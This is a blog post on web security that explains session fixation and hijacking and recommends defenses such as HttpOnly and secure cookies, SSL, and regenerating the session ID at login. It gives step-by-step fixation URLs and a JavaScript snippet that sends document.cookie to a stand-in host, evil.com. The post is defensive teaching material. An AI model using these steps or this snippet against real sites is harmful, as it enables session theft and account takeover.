---
title: 'Session Fixation and Hijacking &#8211; Basic Security Part 6'
author: James
layout: post
permalink: /session-fixation-and-hijacking-basic-security-part-6-801/
bitly_url:
  - http://j0.is/14e0ktJ
bitly_hash:
  - 14e0ktJ
bitly_long_url:
  - http://coffeeonthekeyboard.com/session-fixation-and-hijacking-basic-security-part-6-801/
dsq_thread_id:
  - 1746519726
categories:
  - Security
tags:
  - django
  - django-nyc-security
  - mozilla
  - security
  - sessions
---
*NB: This is the sixth post in a [series][1] of posts on web application security.*

  1. Don&#8217;t put session IDs in the URL. Django explicitly [does not support][2] this because it&#8217;s just dangerous.
  2. Use SSL and `secure` cookies.
  3. Use `HttpOnly` cookies.

Is it really that easy? Yes and no. But start there and you&#8217;ve already gone a really long way.

**Session fixation** and **session hijacking** are both attempts to gain access to a system as another user, hopefully a privileged one (though with some systems, where money is involved, privilege doesn&#8217;t necessarily even matter).

In session fixation, using a session ID in the URL, I try to cause a target to log in with a predictable session ID, then reuse that ID myself:

  1. Send target to `http://unsafe/?PHPSESSID=mysession`, they log in.
  2. Go to `http://unsafe/?PHPSESSID=mysession`: congrats! You look like the same user.

Or the other way, you can cause a user to act like you, and, say, enter their credit card information onto your account.

  1. Login to `http://unsafe/?PHPSESSID=mysession`.
  2. Send other user to `http://unsafe/payment_methods?PHPSESSID=mysession`, and they look like you!

There are other, better mitigations, like tying sessions to IP addresses (though that can be spoofed) and giving them short timeouts (though that runs against best practices for user experience, stay tuned). But first and foremost, don&#8217;t put session IDs in URLs.

There are more [complicated vectors for fixation][3], too. Fortunately most browsers won&#8217;t let you do the easy things and the other OWASP examples rely on an existing [XSS vulerability][4], which hopefully you&#8217;ve taken care of.

Among other things, you can [regenerate a session ID][5] when someone logs in, and should, if your framework and language supports it. (Django does this automatically if you use the built-in authentication tools.)

Then we get to the crossroads of fixation and hijacking. One other route to fix someone&#8217;s session cookie identifier is to use a [Man-in-the-Middle][6] attack to change the `Set-Cookie` header (useful for the latter case, above, getting someone to act like you).

How to address this? Use SSL.

Use SSL because it&#8217;s your best defense against a tool like [Firesheep][7]. It&#8217;s not perfect, it can be MITMed, but this is about [locking your car doors][8]. Login form submissions and session cookies should go over SSL. Certs are cheap, both in price and [computation time][9], just do it.

Finally, make sure your cookies have the [`secure`][10] and [`HttpOnly`][11] flags, especially the session cookie. Django  
supports this now so just use the built-in support. (Django defaults to `HttpOnly`.)

Why? Say someone finds a hole to execute some JS on your site, and if your session cookies aren&#8217;t `HttpOnly` (in fact, every cookie that can be, should be), they could execute this:

    var i = new Image();
    i.src = 'http://evil.com/record?' + document.cookie;
    body.appendChild(i);
    

Grabbing every cookie, but especially the session ID, and impersonating a poor, well-intentioned user.

Finally, make sure to **destroy session data at logout**, or at least mark the session ID as invalid (and thus not let anyone use it) and clean it up later.

## What else?

I can&#8217;t shake the feeling I&#8217;m forgetting something important on this one, so use the comments and let me and everyone else know about the other vectors and mitigations. And check out [Chris Shiflett&#8217;s post][12] on the same topic for more insight.

  * Go to the [series index][8].
  * Go to the previous post in the series, [Access Control][13].
  * Go to the next post in the series, [Server Configuration][14].

 [1]: http://coffeeonthekeyboard.com/best-basic-security-practices-especially-with-django-697/
 [2]: https://docs.djangoproject.com/en/dev/topics/http/sessions/#session-ids-in-urls
 [3]: https://www.owasp.org/index.php/Session_fixation
 [4]: http://coffeeonthekeyboard.com/xss-cross-site-scripting-basic-security-part-2-711/ "XSS: Cross-Site Scripting – Basic Security Part 2"
 [5]: http://php.net/manual/en/function.session-regenerate-id.php
 [6]: https://www.owasp.org/index.php/Man-in-the-middle_attack
 [7]: http://codebutler.com/firesheep
 [8]: http://coffeeonthekeyboard.com/best-basic-security-practices-especially-with-django-697/ "Best Basic Security Practices (Especially with Django)"
 [9]: http://www.imperialviolet.org/2010/06/25/overclocking-ssl.html
 [10]: https://docs.djangoproject.com/en/dev/topics/http/sessions/#session-cookie-secure
 [11]: https://docs.djangoproject.com/en/dev/topics/http/sessions%
 [12]: http://shiflett.org/articles/session-fixation
 [13]: http://coffeeonthekeyboard.com/access-control-basic-security-part-5-765/ "Access Control – Basic Security Part 5"
 [14]: http://coffeeonthekeyboard.com/server-configuration-basic-security-part-7-816/ "Server Configuration – Basic Security Part 7"